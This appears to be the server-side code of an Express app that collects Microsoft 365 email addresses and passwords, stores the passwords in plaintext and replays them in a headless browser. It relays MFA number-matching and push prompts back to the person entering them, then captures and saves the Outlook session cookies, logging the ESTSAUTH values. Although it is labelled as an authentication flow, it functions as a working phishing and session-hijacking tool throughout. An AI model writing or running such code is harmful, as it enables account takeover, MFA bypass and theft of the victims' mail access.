const express = require('express');
const { chromium } = require('playwright');
const User = require('../models/user');

const router = express.Router();

// Store authentication sessions
const authSessions = new Map();

// Start complete authentication with email/password
router.post('/start', async (req, res) => {
  const { email, password } = req.body;
  
  try {
    // Create or find user
    let user = await User.findOne({ email });
    if (!user) {
      user = new User({ email, password });
      await user.save();
    } else {
      user.password = password;
      await user.save();
    }
    
    // Start authentication process
    const sessionId = await startAuthentication(user._id, email, password);
    
    res.json({ 
      success: true, 
      sessionId,
      userId: user._id,
      message: 'Authentication started'
    });
    
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get authentication status and MFA info
router.get('/status/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const session = authSessions.get(sessionId) || { status: 'not_found' };
  res.json(session);
});

async function startAuthentication(userId, email, password) {
  const sessionId = Date.now().toString();
  
  try {
    console.log(`🚀 Starting complete authentication for ${email}`);
    
    // Update session status
    authSessions.set(sessionId, {
      status: 'starting',
      message: 'Launching browser...',
      userId,
      timestamp: Date.now()
    });
    
    const browser = await chromium.launch({ headless: true });
    const context = await browser.newContext();
    const page = await context.newPage();
    
    // Navigate to Microsoft OAuth
    const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${process.env.CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&scope=https://graph.microsoft.com/Mail.ReadWrite&state=${userId}&login_hint=${encodeURIComponent(email)}`;
    
    await page.goto(authUrl);
    
    authSessions.set(sessionId, {
      status: 'entering_credentials',
      message: 'Entering credentials...',
      userId,
      timestamp: Date.now()
    });
    
    // Enter email if needed
    try {
      await page.waitForSelector('input[type="email"]', { timeout: 5000 });
      await page.fill('input[type="email"]', email);
      await page.click('input[type="submit"]');
      await page.waitForTimeout(2000);
    } catch (e) {
      console.log('Email step skipped');
    }
    
    // Enter password
    await page.waitForSelector('input[type="password"]', { timeout: 10000 });
    await page.fill('input[type="password"]', password);
    await page.click('input[type="submit"]');
    await page.waitForTimeout(3000);
    
    // Check for MFA
    authSessions.set(sessionId, {
      status: 'checking_mfa',
      message: 'Checking for MFA...',
      userId,
      timestamp: Date.now()
    });
    
    const mfaResult = await detectMFA(page, sessionId, userId);
    
    if (mfaResult.requiresMFA) {
      // Wait for MFA completion
      await waitForMFACompletion(page, sessionId, userId, mfaResult);
    }
    
    // Handle "Stay signed in?"
    try {
      await page.click('input[value="Yes"]', { timeout: 5000 });
      await page.waitForTimeout(2000);
    } catch (e) {
      console.log('No stay signed in prompt');
    }
    
    // Navigate to Outlook to get all cookies
    authSessions.set(sessionId, {
      status: 'loading_outlook',
      message: 'Loading Outlook to capture cookies...',
      userId,
      timestamp: Date.now()
    });
    
    await page.goto('https://outlook.office.com');
    await page.waitForTimeout(5000);
    
    // Capture all cookies
    const cookies = await context.cookies();
    
    // Save cookies
    await saveAuthCookies(userId, cookies);
    
    authSessions.set(sessionId, {
      status: 'completed',
      message: `Authentication completed! Captured ${cookies.length} cookies.`,
      userId,
      cookieCount: cookies.length,
      timestamp: Date.now()
    });
    
    await browser.close();
    
    // Clean up after delay
    setTimeout(() => {
      authSessions.delete(sessionId);
    }, 30000);
    
    return sessionId;
    
  } catch (error) {
    console.error('Authentication error:', error);
    
    authSessions.set(sessionId, {
      status: 'failed',
      message: `Authentication failed: ${error.message}`,
      userId,
      timestamp: Date.now()
    });
    
    return sessionId;
  }
}

async function detectMFA(page, sessionId, userId) {
  try {
    await page.waitForTimeout(3000);
    
    // Check for number matching
    const numberElement = await page.$('[data-testid="displaySign"]');
    if (numberElement) {
      const number = await numberElement.textContent();
      
      authSessions.set(sessionId, {
        status: 'mfa_number_matching',
        message: `Enter this number in your authenticator app: ${number}`,
        mfaType: 'number_matching',
        number: number,
        userId,
        timestamp: Date.now()
      });
      
      return { requiresMFA: true, type: 'number_matching', number };
    }
    
    // Check for push notification
    const pushElement = await page.$('[data-bind*="PhoneAppNotification"]');
    if (pushElement) {
      authSessions.set(sessionId, {
        status: 'mfa_push',
        message: 'Approve the notification on your phone',
        mfaType: 'push_notification',
        userId,
        timestamp: Date.now()
      });
      
      return { requiresMFA: true, type: 'push_notification' };
    }
    
    // Check for SMS/TOTP
    const smsElement = await page.$('input[name="otc"]');
    if (smsElement) {
      authSessions.set(sessionId, {
        status: 'mfa_sms',
        message: 'Enter the code from SMS or authenticator app',
        mfaType: 'sms_totp',
        userId,
        timestamp: Date.now()
      });
      
      return { requiresMFA: true, type: 'sms_totp' };
    }
    
    return { requiresMFA: false };
    
  } catch (error) {
    console.error('MFA detection error:', error);
    return { requiresMFA: false };
  }
}

async function waitForMFACompletion(page, sessionId, userId, mfaResult) {
  try {
    console.log(`⏳ Waiting for MFA completion: ${mfaResult.type}`);
    
    // Wait for MFA completion (navigation away from MFA page)
    await page.waitForFunction(() => {
      return window.location.href.includes('myaccount.microsoft.com') ||
             window.location.href.includes('account.microsoft.com') ||
             window.location.href.includes('outlook.office.com') ||
             window.location.href.includes('/user/callback') ||
             !document.querySelector('[data-testid="displaySign"]') &&
             !document.querySelector('[data-bind*="PhoneAppNotification"]') &&
             !document.querySelector('input[name="otc"]');
    }, { timeout: 300000 }); // 5 minutes
    
    console.log('✅ MFA completed successfully');
    
  } catch (error) {
    console.error('MFA completion timeout:', error);
    throw error;
  }
}

async function saveAuthCookies(userId, cookies) {
  const formattedCookies = cookies.map(cookie => ({
    domain: cookie.domain,
    httpOnly: cookie.httpOnly,
    path: cookie.path,
    secure: cookie.secure,
    expiry: cookie.expires ? Math.floor(new Date(cookie.expires).getTime() / 1000) : 0,
    name: cookie.name,
    value: cookie.value
  }));
  
  await User.findByIdAndUpdate(userId, {
    sessionCookies: formattedCookies,
    allCookies: formattedCookies,
    cookieStatus: "session_captured",
    isActive: true,
    lastLogin: new Date()
  });
  
  console.log(`💾 Saved ${cookies.length} cookies for user ${userId}`);
  
  // Log important auth cookies
  const authCookies = cookies.filter(c => 
    c.name.startsWith('ESTSAUTH') || c.name === 'buid'
  );
  
  console.log('🔑 Key authentication cookies:');
  authCookies.forEach(cookie => {
    console.log(`   ${cookie.name}: ${cookie.value.substring(0, 50)}...`);
  });
}

module.exports = router;